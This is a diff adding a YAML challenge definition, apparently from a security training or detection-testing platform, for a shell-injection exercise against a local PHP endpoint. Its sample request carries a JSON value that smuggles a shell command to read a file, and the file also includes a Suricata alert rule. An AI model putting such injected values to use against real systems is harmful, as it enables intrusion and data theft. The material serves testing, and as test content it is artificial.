@@ -1,0 +1,33 @@
+name: 'Shell Injection (JSON)'
+type: 'exploit'
+
+text: |-
+  **Goal: Print /app/valuate-hoard**
+
+hints: []
+
+target:
+  dev:
+    host: localhost
+    port: 10007
+  prod:
+    host: detector
+    port: 80
+
+base_request: |-
+  POST /backend.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/json
+  Content-Length: 98
+
+  {
+    "hoardType": "artifact",
+    "gold": "10';cat /app/valuate-hoard; echo '",
+    "gems": "20",
+    "artifacts": "30"
+  }
+
+rules:
+- 'alert http any any -> any any (msg:"%%ID%%"; flow:to_server,established; http.method; content:"GET"; http.uri.raw; content:".."; sid:1030005; rev:1;)'
+
+expected_output: "Perform some math"
